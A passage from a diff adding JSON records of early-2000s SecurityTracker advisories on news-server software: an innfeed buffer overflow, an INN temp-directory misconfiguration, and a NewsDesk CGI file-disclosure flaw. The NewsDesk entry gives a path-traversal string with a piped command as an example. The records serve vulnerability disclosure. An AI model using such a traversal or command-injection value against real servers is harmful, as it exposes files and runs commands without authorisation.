+    "Underlying OS": [
+        "Windows (NT)",
+        "Windows (2000)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "(A User Responds) Re: Innfeed Allows Local Users to Execute Arbitrary Code on the Server Under the News Group Privileges",
+    "SecurityTracker Alert ID": "1001375",
+    "SecurityTracker URL": "http://securitytracker.com/id/1001375",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Apr 20 2001",
+    "Impact": [
+        "Execution of arbitrary code via local system",
+        "User access via local system"
+    ],
+    "Description": "Defcom Labs issued an advisory (def-2001-19) for \"innfeed\" warning that it allows local users to execute arbitrary code on the server.  Innfeed sends news between hosts using the Network News Transfer Protocol (NNTP).\nA user reponds that:\n\n\"This exploit will not affect most installed INN systems, and is, in my opinion, *primarily* a documentation issue (although there are indeed security issues, the main one of which has already been addressed in current versions of INN).\"\n\nSee the source message for full details.",
+    "Impact'": "A local user can cause arbitrary code to be executed on the server with news group id privileges.",
+    "Solution": "A patch has been developed.  See the source message for the patch or contact your operating system vendor.",
+    "Vendor URL": "www.isc.org/",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Mandriva/Mandrake)",
+        "Linux (Red Hat Linux)",
+        "Linux (Slackware)"
+    ],
+    "Underlying OS Comments": "Slackware 7.1, Mandrake 7.0, RedHat 7.2 and older versions of those operating systems",
+    "Message History": [
+        "https://securitytracker.com/id/1001353"
+    ]
+}{
+    "source": "1-2",
+    "Title": "Innfeed Allows Local Users to Execute Arbitrary Code on the Server Under the News Group Privileges",
+    "SecurityTracker Alert ID": "1001353",
+    "SecurityTracker URL": "http://securitytracker.com/id/1001353",
+    "CVE Reference": "CVE-2001-1442",
+    "Updated": "May 12 2008",
+    "Original Entry Date": "Apr 18 2001",
+    "Impact": [
+        "Execution of arbitrary code via local system",
+        "User access via local system"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Exploit Included": "Yes",
+    "Description": "Defcom Labs issued an advisory (def-2001-19) for \"innfeed\" warning that it allows local users to execute arbitrary code on the server.  Innfeed sends news between hosts using the Network News Transfer Protocol (NNTP).\nDefcom reports that there is no bounds checking on the innfeed program when using the -c flag, allowing a buffer overflow to be triggered.\n\nThe buffer overflow exists in the logOrPrint() function on a vsprint() call.  The local user can trigger the overflow to obtain the news group id.  \n\nA description of the offending code, a demonstration exploit script, and a recommended patch is contained in the source message.",
+    "Impact'": "A local user can cause arbitrary code to be executed on the server with news group id privileges.",
+    "Solution": "A patch has been developed.  See the source message for the patch or contact your operating system vendor.",
+    "Vendor URL": "www.isc.org/",
+    "Cause": "Boundary error",
+    "Underlying OS": [
+        "Linux (Mandriva/Mandrake)",
+        "Linux (Red Hat Linux)",
+        "Linux (Slackware)"
+    ],
+    "Underlying OS Comments": "Slackware 7.1, Mandrake 7.0, RedHat 7.2 and older versions of those operating systems",
+    "Message History": [
+        "https://securitytracker.com/id/1001375"
+    ]
+}{
+    "source": "1-2",
+    "Title": "Default InterNetNews Configuration May Allow Local Users to Obtain Access to the News Account",
+    "SecurityTracker Alert ID": "1000603",
+    "SecurityTracker URL": "http://securitytracker.com/id/1000603",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jan 16 2001",
+    "Impact": [
+        "Execution of arbitrary code via local system",
+        "User access via local system"
+    ],
+    "Fix Available": "Yes",
+    "Vendor Confirmed": "Yes",
+    "Version(s)": "Prior to INN 2.3.1",
+    "Description": "It has been announced that some InterNetNews (INN) Usenet news system packages have been inadvertently shipped configured to use the system temporary directory instead of a secure INN-only directory.  This could allow certain attacks against INN by a local user, possibly resulting in a local user obtaining access to the news account.\nINN reportedly expects its configured temporary directory to only be writeable by the news user and does not take sufficient precautions when creating temporary files to allow you to safely use world-writeable temporary directories.  This could be exploited by a local user to gain access to the news account.\n\nThe author of the report recommends that if you are using a pre-compiled version of INN, you should check the configuration in inn.conf and make sure that pathtmp points to a directory that is not world-writeable.",
+    "Impact'": "A local user could obtain access to the news account.",
+    "Solution": "If your current configuration points to a world-writeable directory, create a new directory owned by the news user and only writeable by the news user, change pathtmp in inn.conf to point to that directory, and restart INN (with rc.news stop; rc.news start).\n\nOr, install version 2.3.1, which will warn you during configuration if you try to use a world writable temporary directory.",
+    "Vendor URL": "www.isc.org",
+    "Cause": "Configuration error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}{
+    "source": "1-2",
+    "Title": "NewsDesk CGI Program Remotely Displays Files",
+    "SecurityTracker Alert ID": "1000537",
+    "SecurityTracker URL": "http://securitytracker.com/id/1000537",
+    "CVE Reference": "GENERIC-MAP-NOMATCH",
+    "Date": "Jan  5 2001",
+    "Impact": [
+        "Disclosure of authentication information",
+        "Disclosure of system information",
+        "Disclosure of user information"
+    ],
+    "Exploit Included": "Yes",
+    "Version(s)": "1.2",
+    "Description": "NewsDesk 1.2, a Perl CGI program that provides web-based news server functions, can reportedly remotely display any file on the system.  It may also allow remote execution of commands on the server.\nAdding the string \"/../\" to a NewsDesk management URL allows an attacker to view any file on the server.  This will also list directories on the server that have the same ownership permissions as the NewsDesk server.\n\nRemote command execution may be possible.  An example is \"../../../bin/ls%20/|\".\n\nAccording to the report, the vendor has been contacted.",
+    "Impact'": "An attacker may view any file on the system.  An attacker may also remotely execute some commands on the system.",
+    "Solution": "No solution was available at the time of this entry.",
+    "Vendor URL": "http://38.203.21.83/about.html",
+    "Cause": "Input validation error",
+    "Underlying OS": [
+        "Linux (Any)",
+        "UNIX (Any)"
+    ],
+    "Message History": "None."
+}
